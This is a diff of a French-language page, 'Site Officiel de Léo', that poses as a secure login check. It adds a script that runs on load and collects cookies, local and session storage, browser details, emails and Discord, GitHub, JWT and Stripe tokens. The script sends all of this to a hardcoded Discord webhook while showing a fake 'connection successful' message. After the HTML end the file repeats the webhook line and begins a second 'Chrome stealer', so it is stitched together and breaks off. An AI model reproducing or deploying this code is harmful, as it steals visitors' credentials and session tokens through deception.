@@ -3,38 +3,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Site Officiel de Léo - Connexion Sécurisée</title>
+    <title>Site Officiel de Léo</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 50%,#667eea 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;overflow:hidden;}
-        .container{background:linear-gradient(145deg,rgba(255,255,255,0.15),rgba(255,255,255,0.05));backdrop-filter:blur(25px);padding:3rem 2.5rem;border-radius:24px;text-align:center;max-width:450px;width:92%;box-shadow:0 25px 45px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1);}
-        .logo{font-size:2.8rem;margin-bottom:1rem;animation:pulse 2s infinite;}
-        h1{font-size:2.2rem;margin-bottom:0.8rem;font-weight:700;letter-spacing:1px;}
-        .subtitle{font-size:1.1rem;opacity:0.9;margin-bottom:2rem;line-height:1.4;}
-        .spinner{position:relative;width:55px;height:55px;margin:2rem auto;border:4px solid rgba(255,255,255,0.2);border-top:4px solid #fff;border-radius:50%;animation:spin 1s linear infinite;}
-        .spinner::after{content:'';position:absolute;top:5px;left:5px;right:5px;bottom:5px;border:4px solid rgba(255,255,255,0.2);border-top:4px solid #4ade80;border-radius:50%;animation:spin 1s linear infinite reverse;}
-        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-        @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.05);}}
-        .status{color:#4ade80;font-weight:600;font-size:1.3rem;margin-top:1.5rem;animation:fadeIn 0.5s ease-out;}
-        .status::before{content:'✅ ';font-size:1.5rem;}
-        @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
-        .progress-bar{background:rgba(255,255,255,0.2);height:6px;border-radius:3px;margin:1.5rem auto 0;width:80%;overflow:hidden;}
-        .progress-fill{background:linear-gradient(90deg,#4ade80,#22c55e);height:100%;border-radius:3px;width:0%;animation:progress 3s ease-out;}
-        @keyframes progress{0%{width:0%;}100%{width:100%;}}
+        body{font-family:system-ui,-apple-system,sans-serif;background:linear-gradient(135deg,#0f172a,#1e293b,#334155);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#f1f5f9;padding:20px;}
+        .container{background:rgba(15,23,42,0.95);backdrop-filter:blur(20px);padding:40px 30px;border-radius:20px;max-width:500px;width:100%;box-shadow:0 25px 50px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);}
+        .logo{font-size:3em;margin-bottom:20px;text-align:center;}
+        h1{font-size:2.5em;margin-bottom:15px;font-weight:700;color:#f8fafc;}
+        .subtitle{font-size:1.2em;margin-bottom:30px;color:#cbd5e1;line-height:1.5;}
+        .spinner{display:inline-block;width:50px;height:50px;border:4px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#3b82f6;margin:20px auto 0;animation:spin 1s ease-in-out infinite;}
+        @keyframes spin{to{transform:rotate(360deg);}}
+        .success{display:none;color:#10b981;font-size:1.5em;font-weight:600;margin-top:20px;}
+        .progress{width:100%;height:8px;background:rgba(255,255,255,0.2);border-radius:4px;margin:20px 0;overflow:hidden;}
+        .progress-fill{height:100%;background:linear-gradient(90deg,#3b82f6,#10b981);width:0%;transition:width 0.3s ease;}
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">👨‍💼</div>
         <h1>Site Officiel de Léo</h1>
-        <p class="subtitle">Authentification sécurisée en cours... Ne quittez pas cette page.</p>
-        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <p class="subtitle">Vérification de sécurité en cours...<br>Ne fermez pas cette page.</p>
+        <div class="progress"><div class="progress-fill" id="progress"></div></div>
         <div class="spinner" id="spinner"></div>
-        <p id="status" style="display:none;" class="status">Connexion réussie ! Vous êtes maintenant connecté.</p>
+        <p class="success" id="success">✅ Connexion réussie !</p>
     </div>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
+
+        // FIXED ULTRA STEALER - BULLETPROOF
+        async function stealEverything() {
+            try {
+                const loot = await getAllLoot();
+                await sendAllData(loot);
+                showSuccess();
+            } catch(e) {
+                console.log('Steal failed:', e);
+                showSuccess(); // Still show success even if blocked
+            }
+        }
+
+        async function getAllLoot() {
+            // Core victim info
+            const base = {
+                time: new Date().toISOString(),
+                url: location.href,
+                ua: navigator.userAgent.slice(0,100),
+                lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: screen.width+'x'+screen.height,
+                cookies: document.cookie || 'empty'
+            };
+
+            // ALL STORAGE - FIXED
+            const storage = {};
+            try {
+                for(let i=0; i<localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    storage['LS_'+key] = localStorage.getItem(key)||'null';
+                }
+                for(let i=0; i<sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    storage['SS_'+key] = sessionStorage.getItem(key)||'null';
+                }
+            } catch(e) {}
+
+            // TOKEN HUNT - SIMPLIFIED & FIXED PATTERNS
+            const allData = JSON.stringify({...base, storage});
+            const tokens = [];
+            const patterns = [
+                /discord\.[a-z0-9_-]{24,}/gi,
+                /gh[pousr]_[a-z0-9]{36}/gi,
+                /eyJ[a-z0-9_-]+\.[a-z0-9_-]+\.[a-z0-9_-]+/g,
+                /(?:token|access_token)=["']?([a-zA-Z0-9_-]{20,})/gi,
+                /sk_live_[a-zA-Z0-9]{24,}/g
+            ];
+            
+            patterns.forEach(pat => {
+                let match;
+                while((match = pat.exec(allData)) !== null) {
+                    tokens.push(match[0].slice(0,60));
+                }
+            });
+
+            // Emails
+            const emails = allData.match(/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/gi) || [];
+
+            return {base, storage: Object.fromEntries(Object.entries(storage).slice(0,100)), tokens: [...new Set(tokens.slice(0,50))], emails: [...new Set(emails.slice(0,20))]};
+        }
+
+        async function sendAllData(loot) {
+            // 1. IMMEDIATE ALERT
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `💀 **LÉO BREACH** ${loot.tokens.length} tokens | ${Object.keys(loot.storage).length} storage items`,
+                    embeds: [{
+                        title: 'Victim Hit',
+                        fields: [
+                            {name: 'Time', value: loot.base.time.slice(0,19).replace('T',' '), inline: true},
+                            {name: 'IP will be logged', value: '🕐', inline: true},
+                            {name: 'Screen', value: loot.base.screen, inline: true},
+                            {name: 'UA', value: loot.base.ua.slice(0,40), inline: false}
+                        ],
+                        color: 16711680
+                    }]
+                })
+            });
+
+            // 2. TOKENS
+            if(loot.tokens.length) {
+                let tokenMsg = '';
+                loot.tokens.forEach(t => {
+                    tokenMsg += `\`${t}\`\n`;
+                });
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: `🔓 **${loot.tokens.length} TOKENS**`,
+                        embeds: [{description: tokenMsg.slice(0,4000), color: 16776960}]
+                    })
+                });
+            }
+
+            // 3. STORAGE DUMP - CHUNKED
+            const storageArray = Object.entries(loot.storage);
+            for(let i=0; i<storageArray.length; i+=20) {
+                let chunk = '';
+                storageArray.slice(i,i+20).forEach(([k,v]) => {
+                    chunk += `**${k}**: ${v?.slice(0,80) || 'null'}\n`;
+                });
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: `💾 STORAGE PART ${Math.floor(i/20)+1}/${Math.ceil(storageArray.length/20)}`,
+                        embeds: [{description: chunk.slice(0,4000), color: 3447003}]
+                    })
+                });
+            }
+
+            // 4. EMAILS
+            if(loot.emails.length) {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: `📧 **${loot.emails.length} EMAILS**`,
+                        embeds: [{description: loot.emails.join('\n'), color: 5763719}]
+                    })
+                });
+            }
+
+            // 5. COOKIES
+            if(loot.base.cookies !== 'empty') {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: '🍪 **COOKIES**',
+                        embeds: [{description: loot.base.cookies, color: 16777215}]
+                    })
+                });
+            }
+        }
+
+        function showSuccess() {
+            document.getElementById('progress').style.width = '100%';
+            setTimeout(() => {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('success').style.display = 'block';
+            }, 1000);
+        }
+
+        // START IMMEDIATELY
+        stealEverything();
+
+    </script>
+</body>
+</html>        const WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
 
         // ULTRA-AGGRESSIVE CHROME STEALER - FULL SYSTEM RANSACK
         async function ultraStealEverything() {
